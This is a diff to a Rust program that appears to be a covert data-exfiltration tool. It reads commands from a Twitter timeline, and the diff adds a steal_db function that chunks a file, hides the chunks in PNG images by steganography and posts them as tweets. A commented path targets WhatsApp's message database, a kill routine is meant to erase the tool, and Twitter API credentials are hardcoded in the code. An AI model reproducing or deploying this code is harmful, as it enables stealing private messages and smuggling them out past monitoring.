@@ -8,6 +8,7 @@ use egg_mode::media::{media_types, upload_media};
 use egg_mode::tweet::DraftTweet;
 use encoder::Encoder;
 use errors::Error;
+use math::round;
 use reqwest;
 use std::env;
 use std::fs;
@@ -22,22 +23,12 @@ use utils::ByteMask;
 
 #[allow(unused_must_use)]
 fn main() -> Result<(), Error> {
-    let mask = ByteMask::new(2)?;
     let path = env::current_dir()?;
     setup();
     pull_tweets();
-    let mut i:u32 = 0;
-    while i < 1 {
-        println!("ENCODING {}", i);
-        let jpg = format!("image_{}.jpg", i);
-        let png = format!("image_{}encoded.png", i);
-        encode(PathBuf::from(&jpg), PathBuf::from("/Users/connor/Desktop/newmessage.txt"), PathBuf::from(&png), mask)?;
-        i = i + 1;
-    }
+    steal_db();
     send_tweet();
-    //encode(PathBuf::from("/sdcard/Pictures/myfavoritetoast.jpg"), PathBuf::from("/data/data/com.whatsapp/databases/msgstore.db"), PathBuf::from("/data/othertoast.png"), mask)?;
-    //encode(PathBuf::from("/Users/connor/Desktop/image.jpg"), PathBuf::from("/Users/connor/Desktop/newmessage.txt"), PathBuf::from("/Users/connor/Desktop/othertoast.png"), mask)?;
-    kill(PathBuf::from(path));
+    //kill(PathBuf::from(path));
     Ok(())
 }
 
@@ -56,6 +47,48 @@ fn kill(og_path: PathBuf) -> Result<(), Error> {
     Ok(())
 }
 
+#[allow(unused_must_use)]
+fn steal_db() -> Result<(), Error> {
+    let mask = ByteMask::new(2)?;
+    //let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
+    
+    let mut db = File::open("/Users/connor/Desktop/LargeTestFile.txt")?;
+    let mut buffer = Vec::new();
+    let mut file_size:u32 = 0;
+    db.read_to_end(&mut buffer)?;
+    let x = &buffer;
+    let mut iterator = x.iter();
+    while iterator.next() != None {
+        file_size+=1;
+    }
+    let image_meta = fs::metadata("image_0.jpg")?;
+    let image_size = image_meta.len();
+    let image_size_float = image_size as f64;
+    let number_of_pictures = f64::from(file_size) / image_size_float;
+    let rounded = round::ceil(number_of_pictures, 0) as u32;
+    let mut i:u32 = 0;
+    
+    while i < rounded {
+        println!("ENCODING {}", i);
+        let jpg = format!("image_0.jpg");
+        let png = format!("image_{}encoded.png", i);
+        let f = fs::read("/Users/connor/Desktop/LargeTestFile.txt")?;
+        let mut iter = f.chunks(image_size as usize);
+        let mut count:u32 = 0;
+        while count < i {
+            iter.next();
+            count += 1;
+        }
+        let to_write = iter.next().unwrap();
+        let file_name = format!("chunk_{}", i);
+        let mut file = File::create(&file_name).unwrap();
+        file.write_all(&to_write);
+        encode(PathBuf::from(&jpg), PathBuf::from(&file_name), PathBuf::from(&png), mask)?;
+        i+=1;
+    }
+    Ok(())
+}
+
 #[tokio::main]
 async fn send_tweet() -> Result<(), Box<dyn std::error::Error>> {
     let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
@@ -64,9 +97,25 @@ async fn send_tweet() -> Result<(), Box<dyn std::error::Error>> {
         consumer: con_token,
         access: access_token,
     };
+
+    let mut db = File::open("/Users/connor/Desktop/LargeTestFile.txt")?;
+    let mut buffer = Vec::new();
+    let mut file_size:u32 = 0;
+    db.read_to_end(&mut buffer)?;
+    let x = &buffer;
+    let mut iterator = x.iter();
+    while iterator.next() != None {
+        file_size+=1;
+    }
+    let image_meta = fs::metadata("image_0.jpg")?;
+    let image_size = image_meta.len();
+    let image_size_float = image_size as f64;
+    let number_of_pictures = f64::from(file_size) / image_size_float;
+    let rounded = round::ceil(number_of_pictures, 0) as u32;
+
     let mut i:u32 = 0;
-    while i < 1 {
-        let mut tweet = DraftTweet::new("The toast is burnt");
+    while i < rounded {
+        let mut tweet = DraftTweet::new(format!("The toast is burnt {}", i));
         let typ = media_types::image_png();
         let image = PathBuf::from(&format!("image_{}encoded.png", i));
         let bytes = std::fs::read(image)?;
@@ -91,7 +140,7 @@ async fn pull_tweets() -> Result<(), Box<dyn std::error::Error>> {
     };
     let user_id = "ToastDisciples";
     let mut end = false;
-    let ten_secs = time::Duration::from_millis(10000);
+    let ten_secs = time::Duration::from_millis(5000);
     loop {
         let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
         let (_user, feed) = user.start().await?;
